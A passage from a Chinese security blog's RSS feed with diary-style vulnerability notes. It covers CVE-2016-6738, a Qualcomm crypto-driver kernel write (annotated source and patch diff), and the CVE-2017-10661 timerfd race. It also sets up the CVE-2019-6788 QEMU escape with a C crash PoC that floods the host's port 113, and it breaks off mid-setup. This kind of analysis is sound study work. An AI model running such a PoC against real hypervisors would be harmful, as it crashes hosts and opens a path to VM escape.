                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/04/17/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.04.17.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.04.14</title>
                <description>&lt;p&gt;发现一个好项目，可能之前我看过但是没仔细学习，最近可以算是真正开始认真分析了&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/jiayy/android_vuln_poc-exp&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;冰刃实验室写的《高通加解密引擎提权漏洞解析》，写的相当好，又学习到了很多&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.iceswordlab.com/2017/08/07/qualcomm-crypto-engine-vulnerabilities-exploits/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我这里分析的是其中的CVE-2016-6738，高通加解密驱动模块内核任意地址写漏洞，补丁如下&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://source.codeaurora.org/quic/la//kernel/msm-3.18/commit/?id=0a2528569b035a2ca8ebe9a4612dbbaaaffa5b2e&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;注册的驱动结构体&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static struct platform_driver qcedev_plat_driver = {
	.probe = qcedev_probe,
	.remove = qcedev_remove,
	.suspend = qcedev_suspend,
	.resume = qcedev_resume,
	.driver = {
		.name = &quot;qce&quot;,
		.owner = THIS_MODULE,
		.of_match_table = qcedev_match,
	},
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;所以我们打开驱动的代码如下&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int fd = open(&quot;/dev/qce&quot;, O_RDONLY);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;根据文档描述，我们可以通过IOCTL进行调用&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;The following IOCTLS are available to the user space application(s)-

  Cipher IOCTLs:
  --------------
    QCEDEV_IOCTL_ENC_REQ is for encrypting data.
    QCEDEV_IOCTL_DEC_REQ is for decrypting data.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;该驱动对应的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file_operations&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static int qcedev_open(struct inode *inode, struct file *file);
static int qcedev_release(struct inode *inode, struct file *file);

static const struct file_operations qcedev_fops = {
	.owner = THIS_MODULE,
	.unlocked_ioctl = qcedev_ioctl,
#ifdef CONFIG_COMPAT
	.compat_ioctl = compat_qcedev_ioctl,
#endif
	.open = qcedev_open,
	.release = qcedev_release,
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;找到函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;qcedev_ioctl()&lt;/code&gt;对应的实现&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;long qcedev_ioctl(struct file *file, unsigned cmd, unsigned long arg)
{
    int err = 0;
	struct qcedev_handle *handle;
	struct qcedev_control *podev;
	struct qcedev_async_req qcedev_areq;
	struct qcedev_stat *pstat;
	
    ...
    
	switch (cmd) {
	// 通过 IOCTL 进行加解密功能的请求
	case QCEDEV_IOCTL_ENC_REQ:
	case QCEDEV_IOCTL_DEC_REQ:
	    // 用户态地址检查
		if (!access_ok(VERIFY_WRITE, (void __user *)arg, sizeof(struct qcedev_cipher_op_req)))
			return -EFAULT;

        // 通过地址检查后进行拷贝操作
        // 用户可控：qcedev_areq-&amp;gt;cipher_op_req
		if (__copy_from_user(&amp;amp;qcedev_areq.cipher_op_req, (void __user *)arg, sizeof(struct qcedev_cipher_op_req)))
			return -EFAULT;
		qcedev_areq.op_type = QCEDEV_CRYPTO_OPER_CIPHER;

        // 参数检查，非常多的判断
		if (qcedev_check_cipher_params(&amp;amp;qcedev_areq.cipher_op_req, podev))
			return -EINVAL;

        // 执行加解密逻辑
		err = qcedev_vbuf_ablk_cipher(&amp;amp;qcedev_areq, handle);
		if (err)
			return err;
			
		// 加解密成功，将数据写入用户态空间
		if (__copy_to_user((void __user *)arg, &amp;amp;qcedev_areq.cipher_op_req, sizeof(struct qcedev_cipher_op_req)))
			return -EFAULT;
		break;
	
    ...
    
	default:
		return -ENOTTY;
	}

	return err;
}
EXPORT_SYMBOL(qcedev_ioctl);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;结构体&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;qcedev_cipher_op_req&lt;/code&gt;的实现&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;struct	qcedev_cipher_op_req {
	uint8_t				use_pmem;
	union {
		struct qcedev_pmem_info	pmem;
		struct qcedev_vbuf_info	vbuf;
	};
	uint32_t			entries;
	uint32_t			data_len;
	uint8_t				in_place_op;
	uint8_t				enckey[QCEDEV_MAX_KEY_SIZE];
	uint32_t			encklen;
	uint8_t				iv[QCEDEV_MAX_IV_SIZE];
	uint32_t			ivlen;
	uint32_t			byteoffset;
	enum qcedev_cipher_alg_enum	alg;
	enum qcedev_cipher_mode_enum	mode;
	enum qcedev_oper_enum		op;
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;问题出在函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;qcedev_vbuf_ablk_cipher()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static int qcedev_vbuf_ablk_cipher(struct qcedev_async_req *areq, struct qcedev_handle *handle)
{
	int err = 0;
	int di = 0;
	int i = 0;
	int j = 0;
	int k = 0;
	uint32_t byteoffset = 0;
	int num_entries = 0;
	uint32_t total = 0;
	uint32_t len;
	uint8_t *k_buf_src = NULL;
	uint8_t *k_align_src = NULL;
	uint32_t max_data_xfer;
	struct qcedev_cipher_op_req *saved_req;
	struct	qcedev_cipher_op_req *creq = &amp;amp;areq-&amp;gt;cipher_op_req;

	/* Verify Source Address's */
	// 进行用户态地址检查
	// 变量 vbuf 表示待处理的数据
	// 用户可控：areq-&amp;gt;cipher_op_req.entries
	for (i = 0; i &amp;lt; areq-&amp;gt;cipher_op_req.entries; i++)
		if (!access_ok(VERIFY_READ, (void __user *)areq-&amp;gt;cipher_op_req.vbuf.src[i].vaddr, areq-&amp;gt;cipher_op_req.vbuf.src[i].len))
			return -EFAULT;

	/* Verify Destination Address's */
	// 进行用户态地址检查
	// 有趣的是：如果 creq-&amp;gt;in_place_op 为1就不进入if检查
	// 更有趣的是：creq-&amp;gt;in_place_op 用户可控
	// 也就是说：我们这里可以绕过地址检查
	if (creq-&amp;gt;in_place_op != 1) {
	    // #define QCEDEV_MAX_BUFFERS      16
		for (i = 0, total = 0; i &amp;lt; QCEDEV_MAX_BUFFERS; i++) {
			if ((areq-&amp;gt;cipher_op_req.vbuf.dst[i].vaddr != 0) &amp;amp;&amp;amp; (total &amp;lt; creq-&amp;gt;data_len)) {
				if (!access_ok(VERIFY_WRITE, (void __user *)creq-&amp;gt;vbuf.dst[i].vaddr, creq-&amp;gt;vbuf.dst[i].len)) {
					pr_err(&quot;%s:DST WR_VERIFY err %d=0x%lx\n&quot;, __func__, i, (uintptr_t)creq-&amp;gt;vbuf.dst[i].vaddr);
					return -EFAULT;
				}
				total += creq-&amp;gt;vbuf.dst[i].len;
			}
		}
	} else  {
		for (i = 0, total = 0; i &amp;lt; creq-&amp;gt;entries; i++) {
			if (total &amp;lt; creq-&amp;gt;data_len) {
				if (!access_ok(VERIFY_WRITE, (void __user *)creq-&amp;gt;vbuf.src[i].vaddr, creq-&amp;gt;vbuf.src[i].len)) {
					pr_err(&quot;%s:SRC WR_VERIFY err %d=0x%lx\n&quot;, __func__, i, (uintptr_t)creq-&amp;gt;vbuf.src[i].vaddr);
					return -EFAULT;
				}
				total += creq-&amp;gt;vbuf.src[i].len;
			}
		}
	}
	total = 0;

    // 用户可控：areq-&amp;gt;cipher_op_req.mode
    // 用户可控：areq-&amp;gt;cipher_op_req.byteoffset
	if (areq-&amp;gt;cipher_op_req.mode == QCEDEV_AES_MODE_CTR)
		byteoffset = areq-&amp;gt;cipher_op_req.byteoffset;
	
	// #define QCE_MAX_OPER_DATA		0xFF00
	// #define CACHE_LINE_SIZE 32
	// #define GFP_KERNEL	(__GFP_WAIT | __GFP_IO | __GFP_FS)
	// 分配堆空间
	k_buf_src = kmalloc(QCE_MAX_OPER_DATA + CACHE_LINE_SIZE * 2, GFP_KERNEL);
	if (k_buf_src == NULL) {
		pr_err(&quot;%s: Can't Allocate memory: k_buf_src 0x%lx\n&quot;, __func__, (uintptr_t)k_buf_src);
		return -ENOMEM;
	}
	// 内存对齐
	k_align_src = (uint8_t *)ALIGN(((uintptr_t)k_buf_src), CACHE_LINE_SIZE);
	max_data_xfer = QCE_MAX_OPER_DATA - byteoffset;

    ...

	if (areq-&amp;gt;cipher_op_req.data_len &amp;gt; max_data_xfer) {
	
		...
	
	} else
		err = qcedev_vbuf_ablk_cipher_max_xfer(areq, &amp;amp;di, handle, k_align_src);
    
    ...
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;qcedev_vbuf_ablk_cipher_max_xfer()&lt;/code&gt;会把申请的堆内存指针传入处理&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static int qcedev_vbuf_ablk_cipher_max_xfer(struct qcedev_async_req *areq,
				int *di, struct qcedev_handle *handle,
				uint8_t *k_align_src)
{
	int err = 0;
	int i = 0;
	int dst_i = *di;
	struct scatterlist sg_src;
	uint32_t byteoffset = 0;
	uint8_t *user_src = NULL;
	uint8_t *k_align_dst = k_align_src;
	struct	qcedev_cipher_op_req *creq = &amp;amp;areq-&amp;gt;cipher_op_req;

    // 用户可控：areq-&amp;gt;cipher_op_req.mode
	if (areq-&amp;gt;cipher_op_req.mode == QCEDEV_AES_MODE_CTR)
		byteoffset = areq-&amp;gt;cipher_op_req.byteoffset;

    // 拷贝第一份待处理数据
	user_src = (void __user *)areq-&amp;gt;cipher_op_req.vbuf.src[0].vaddr;
	if (user_src &amp;amp;&amp;amp; __copy_from_user((k_align_src + byteoffset), (void __user *)user_src, areq-&amp;gt;cipher_op_req.vbuf.src[0].len))
		return -EFAULT;

    // 移动指针指向新的写入偏移
	k_align_src += byteoffset + areq-&amp;gt;cipher_op_req.vbuf.src[0].len;

    // 开始循环后面的待处理数据
	for (i = 1; i &amp;lt; areq-&amp;gt;cipher_op_req.entries; i++) {
		user_src = (void __user *)areq-&amp;gt;cipher_op_req.vbuf.src[i].vaddr;
		if (user_src &amp;amp;&amp;amp; __copy_from_user(k_align_src, (void __user *)user_src, areq-&amp;gt;cipher_op_req.vbuf.src[i].len)) {
			return -EFAULT;
		}
		k_align_src += areq-&amp;gt;cipher_op_req.vbuf.src[i].len;
	}

	/* restore src beginning */
	// 循环拷贝待处理数据完毕
	// 恢复堆空间起始地址
	k_align_src = k_align_dst;
	areq-&amp;gt;cipher_op_req.data_len += byteoffset;

	areq-&amp;gt;cipher_req.creq.src = (struct scatterlist *) &amp;amp;sg_src;
	areq-&amp;gt;cipher_req.creq.dst = (struct scatterlist *) &amp;amp;sg_src;

	/* In place encryption/decryption */
	sg_set_buf(areq-&amp;gt;cipher_req.creq.src, k_align_dst, areq-&amp;gt;cipher_op_req.data_len);
	sg_mark_end(areq-&amp;gt;cipher_req.creq.src);

	areq-&amp;gt;cipher_req.creq.nbytes = areq-&amp;gt;cipher_op_req.data_len;
	areq-&amp;gt;cipher_req.creq.info = areq-&amp;gt;cipher_op_req.iv;
	areq-&amp;gt;cipher_op_req.entries = 1;

    // 执行加解密操作
    // 处理完成后 k_align_dst 指向的就是处理完毕后的数据
	err = submit_req(areq, handle);

	/* copy data to destination buffer*/
	creq-&amp;gt;data_len -= byteoffset;

    // 重点关注对 creq-&amp;gt;vbuf.dst 处理的逻辑
	while (creq-&amp;gt;data_len &amp;gt; 0) {
		if (creq-&amp;gt;vbuf.dst[dst_i].len &amp;lt;= creq-&amp;gt;data_len) {
		    // 当还有数据的时候，就进行拷贝，拷贝的值是经过加解密后的数据
			if (err == 0 &amp;amp;&amp;amp; __copy_to_user((void __user *)creq-&amp;gt;vbuf.dst[dst_i].vaddr, (k_align_dst + byteoffset), creq-&amp;gt;vbuf.dst[dst_i].len))
				return -EFAULT;

			k_align_dst += creq-&amp;gt;vbuf.dst[dst_i].len + byteoffset;
			creq-&amp;gt;data_len -= creq-&amp;gt;vbuf.dst[dst_i].len;
			dst_i++;
		} else {
			if (err == 0 &amp;amp;&amp;amp; __copy_to_user((void __user *)creq-&amp;gt;vbuf.dst[dst_i].vaddr, (k_align_dst + byteoffset), creq-&amp;gt;data_len))
				return -EFAULT;

			k_align_dst += creq-&amp;gt;data_len;
			creq-&amp;gt;vbuf.dst[dst_i].len -= creq-&amp;gt;data_len;
			creq-&amp;gt;vbuf.dst[dst_i].vaddr += creq-&amp;gt;data_len;
			creq-&amp;gt;data_len = 0;
		}
	}
	*di = dst_i;

	return err;
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;根据定义，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__copy_to_user()&lt;/code&gt;直接就是拷贝，并没有对地址进行检查操作&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#define __copy_from_user(to,from,n)	(memcpy(to, (void __force *)from, n), 0)
#define __copy_to_user(to,from,n)	(memcpy((void __force *)to, from, n), 0)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;所以这里存在一处内核空间任意地址写的漏洞&lt;/p&gt;

&lt;p&gt;补丁直接去掉了对&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;creq-&amp;gt;in_place_op != 1&lt;/code&gt;的判断，这样就老老实实的两个地址都检查一遍&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;diff --git a/drivers/crypto/msm/qcedev.c b/drivers/crypto/msm/qcedev.c
index e63f061..1402d3d 100644
--- a/drivers/crypto/msm/qcedev.c
+++ b/drivers/crypto/msm/qcedev.c
@@ -1234,44 +1234,6 @@ static int qcedev_vbuf_ablk_cipher(struct qcedev_async_req *areq,
 	struct qcedev_cipher_op_req *saved_req;
 	struct	qcedev_cipher_op_req *creq = &amp;amp;areq-&amp;gt;cipher_op_req;
 
-	/* Verify Source Address's */
-	for (i = 0; i &amp;lt; areq-&amp;gt;cipher_op_req.entries; i++)
-		if (!access_ok(VERIFY_READ,
-			(void __user *)areq-&amp;gt;cipher_op_req.vbuf.src[i].vaddr,
-					areq-&amp;gt;cipher_op_req.vbuf.src[i].len))
-			return -EFAULT;
-
-	/* Verify Destination Address's */
-	if (creq-&amp;gt;in_place_op != 1) {
-		for (i = 0, total = 0; i &amp;lt; QCEDEV_MAX_BUFFERS; i++) {
-			if ((areq-&amp;gt;cipher_op_req.vbuf.dst[i].vaddr != 0) &amp;amp;&amp;amp;
-						(total &amp;lt; creq-&amp;gt;data_len)) {
-				if (!access_ok(VERIFY_WRITE,
-					(void __user *)creq-&amp;gt;vbuf.dst[i].vaddr,
-						creq-&amp;gt;vbuf.dst[i].len)) {
-					pr_err(&quot;%s:DST WR_VERIFY err %d=0x%lx\n&quot;,
-						__func__, i, (uintptr_t)
-						creq-&amp;gt;vbuf.dst[i].vaddr);
-					return -EFAULT;
-				}
-				total += creq-&amp;gt;vbuf.dst[i].len;
-			}
-		}
-	} else  {
-		for (i = 0, total = 0; i &amp;lt; creq-&amp;gt;entries; i++) {
-			if (total &amp;lt; creq-&amp;gt;data_len) {
-				if (!access_ok(VERIFY_WRITE,
-					(void __user *)creq-&amp;gt;vbuf.src[i].vaddr,
-						creq-&amp;gt;vbuf.src[i].len)) {
-					pr_err(&quot;%s:SRC WR_VERIFY err %d=0x%lx\n&quot;,
-						__func__, i, (uintptr_t)
-						creq-&amp;gt;vbuf.src[i].vaddr);
-					return -EFAULT;
-				}
-				total += creq-&amp;gt;vbuf.src[i].len;
-			}
-		}
-	}
 	total = 0;
 
 	if (areq-&amp;gt;cipher_op_req.mode == QCEDEV_AES_MODE_CTR)
@@ -1569,6 +1531,36 @@ static int qcedev_check_cipher_params(struct qcedev_cipher_op_req *req,
 			__func__, total, req-&amp;gt;data_len);
 		goto error;
 	}
+	/* Verify Source Address's */
+	for (i = 0, total = 0; i &amp;lt; req-&amp;gt;entries; i++) {
+		if (total &amp;lt; req-&amp;gt;data_len) {
+			if (!access_ok(VERIFY_READ,
+				(void __user *)req-&amp;gt;vbuf.src[i].vaddr,
+					req-&amp;gt;vbuf.src[i].len)) {
+					pr_err(&quot;%s:SRC RD_VERIFY err %d=0x%lx\n&quot;,
+						__func__, i, (uintptr_t)
+							req-&amp;gt;vbuf.src[i].vaddr);
+					goto error;
+			}
+			total += req-&amp;gt;vbuf.src[i].len;
+		}
+	}
+
+	/* Verify Destination Address's */
+	for (i = 0, total = 0; i &amp;lt; QCEDEV_MAX_BUFFERS; i++) {
+		if ((req-&amp;gt;vbuf.dst[i].vaddr != 0) &amp;amp;&amp;amp;
+			(total &amp;lt; req-&amp;gt;data_len)) {
+			if (!access_ok(VERIFY_WRITE,
+				(void __user *)req-&amp;gt;vbuf.dst[i].vaddr,
+					req-&amp;gt;vbuf.dst[i].len)) {
+					pr_err(&quot;%s:DST WR_VERIFY err %d=0x%lx\n&quot;,
+						__func__, i, (uintptr_t)
+							req-&amp;gt;vbuf.dst[i].vaddr);
+					goto error;
+			}
+			total += req-&amp;gt;vbuf.dst[i].len;
+		}
+	}
 	return 0;
 error:
 	return -EINVAL;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;稍微改了改计划，接下来大概每周写一个漏洞分析，其它时间多读书，多看师傅们写的文章，把知识点补上，然后学习一下Web相关的知识，纯本地安全没前途，还是要多搞搞逻辑漏洞和Web漏洞&lt;/p&gt;

&lt;p&gt;So漏洞我有点想法，下个月实现一下&lt;/p&gt;
</description>
                <pubDate>Tue, 14 Apr 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/04/14/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.04.14.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/04/14/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.04.14.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.04.12</title>
                <description>&lt;p&gt;上周周末在家里跟朱老师远程技术互相分享了一波，感谢大佬给我讲的ROOT技术，学到了很多，感觉技术又进步了&lt;/p&gt;

&lt;p&gt;这周周末又跟唐师傅，椰子师傅，汪师傅学习了一波甲方安全，涨了一大波知识，只可惜ZOOM一直掉线，下次换个工具&lt;/p&gt;

&lt;p&gt;剩下的时间就是仔细学习朱老师给我的资料，看了CVE-2017-8890和CVE-2017-10661&lt;/p&gt;

&lt;p&gt;这两个漏洞网络上有大量的分析调试利用文章，啥时候能自己挖一波提权漏洞啊？&lt;/p&gt;

&lt;p&gt;CVE-2017-10661是一个条件竞争漏洞&lt;/p&gt;

&lt;p&gt;补丁如下&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/?id=1e38da300e1e395a15048b0af1e5305bd91402f6&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;补丁描述&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;timerfd: Protect the might cancel mechanism proper&lt;/strong&gt;&lt;br /&gt;
The handling of the might_cancel queueing is not properly protected, so
parallel operations on the file descriptor can race with each other and
lead to list corruptions or use after free.&lt;br /&gt;
Protect the context for these operations with a seperate lock.&lt;br /&gt;
The wait queue lock cannot be reused for this because that would create a lock inversion scenario vs. the cancel lock. Replacing might_cancel with an atomic (atomic_t or atomic bit) does not help either because it still can race vs. the actual list operation.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;简单翻译就是：对&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;might_cancel&lt;/code&gt;进行判断的时候，由于没有锁保护，会导致条件竞争漏洞&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static void timerfd_setup_cancel(struct timerfd_ctx *ctx, int flags)
{
    if ((ctx-&amp;gt;clockid == CLOCK_REALTIME ||
        ctx-&amp;gt;clockid == CLOCK_REALTIME_ALARM) &amp;amp;&amp;amp;
        (flags &amp;amp; TFD_TIMER_ABSTIME) &amp;amp;&amp;amp; (flags &amp;amp; TFD_TIMER_CANCEL_ON_SET)) {
        if (!ctx-&amp;gt;might_cancel) { // &amp;lt;--
            ctx-&amp;gt;might_cancel = true;
            spin_lock(&amp;amp;cancel_lock);
            list_add_rcu(&amp;amp;ctx-&amp;gt;clist, &amp;amp;cancel_list);
            spin_unlock(&amp;amp;cancel_lock);
        }
    } else if (ctx-&amp;gt;might_cancel) {
        timerfd_remove_cancel(ctx);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;比如两个线程同时进来，A线程先通过判断进入了if，但是还没执行到赋值为true的指令，然后B线程也进来了，那么就会造成执行两次if分支块的指令，最后会造成两次将&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctx&lt;/code&gt;加入到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cancel_list&lt;/code&gt;，往后就是链表的利用了&lt;/p&gt;

&lt;p&gt;剩下的时间其实一直在看书，一共是三本书：Linux驱动，Android逆向和iOS逆向&lt;/p&gt;

&lt;p&gt;慌的一逼，啥都不会，只能抓紧时间看书学习知识&lt;/p&gt;

&lt;p&gt;人往高处走，水往低处流，至于土豆，一个坑，不挪窝:)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;以下跟技术无关&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;发个牢骚：在甲方搞业务安全真的是，一言难尽，有些业务线白天写代码，晚上八九点才提测，每次都说着急上线，对付这样的业务线我有个好办法，凌晨的时候给他们报一个漏洞，修去吧:)&lt;/p&gt;

&lt;p&gt;想骂人，想想还是算了，毕竟我这十来个读者里面不少还是学生，祖国未来的花朵要在阳光正能量的环境下成长&lt;/p&gt;

&lt;p&gt;还有件事，今天看到一个安全团队（团伙？）写了一篇漏洞分析，里面的描述是”xxx团队yyy小组的zzz师傅分析”，我觉得转载其他人的文章互相客气一下尊称一声师傅，自己管自己人叫师傅，我突然有一种进了澡堂子的感觉，大家不要对号入座，就当个乐看&lt;/p&gt;
</description>
                <pubDate>Sun, 12 Apr 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/04/12/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.04.12.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/04/12/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.04.12.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.04.04</title>
                <description>&lt;p&gt;今天仔细把QEMU逃逸漏洞CVE-2019-6788的细节描述一下&lt;/p&gt;

&lt;p&gt;搭建环境不多说了，大家可以参考《qemu-pwn cve-2019-6788堆溢出漏洞分析》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://ray-cp.github.io/archivers/qemu-pwn-cve-2019-6788%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;使用GDB调试启动QEMU虚拟机&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;file ./qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64
run -kernel ./Kernel/linux-5.2.11/arch/x86/boot/bzImage -append &quot;console=ttyS0 root=/dev/sda rw&quot; -hda ./rootfs.img -m 2G -nographic -L ./pc-bios -smp 1 -net user,hostfwd=tcp::6788-:22 -net nic
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Poc如下&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;netdb.h&amp;gt;
#include &amp;lt;arpa/inet.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;

int main() {
    int s, ret;
    struct sockaddr_in ip_addr;
    char buf[0x500];

    s = socket(AF_INET, SOCK_STREAM, 0);
    ip_addr.sin_family = AF_INET;
    ip_addr.sin_addr.s_addr = inet_addr(&quot;10.0.2.2&quot;); // host IP
    ip_addr.sin_port = htons(113);                   // vulnerable port
    ret = connect(s, (struct sockaddr *)&amp;amp;ip_addr, sizeof(struct sockaddr_in));
    memset(buf, 'A', 0x500);
    while (1) {
        write(s, buf, 0x500);
    }
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在宿主机编译&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wnagzihxa1n@Qemu:~/CVE-2019-6788/qemu-vm-escape$ gcc -o crash_poc crash_poc.c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;将Poc传递到QEMU有很多种方法，我这里使用最简单的一种，宿主机开启一个Web服务&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wnagzihxa1n@Qemu:~/CVE-2019-6788/qemu-vm-escape$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后QEMU虚拟机&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget&lt;/code&gt;获取即可&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@ubuntu:~# wget 10.0.2.2:8000/crash_poc
--2020-04-02 03:44:21--  http://10.0.2.2:8000/crash_poc
Connecting to 10.0.2.2:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8872 (8.7K) [application/octet-stream]
Saving to: 'crash_poc'

crash_poc           100%[===================&amp;gt;]   8.66K  --.-KB/s    in 0.004s  

2020-04-02 03:44:21 (2.00 MB/s) - 'crash_poc' saved [8872/8872]

root@ubuntu:~# chmod 777 crash_poc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Web服务监控到文件传输&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Serving HTTP on 0.0.0.0 port 8000 ...
127.0.0.1 - - [02/Apr/2020 11:44:21] &quot;GET /crash_poc HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;此时QEMU虚拟机环境已经准备好，我们在宿主机开启端口监听&lt;/p&gt;
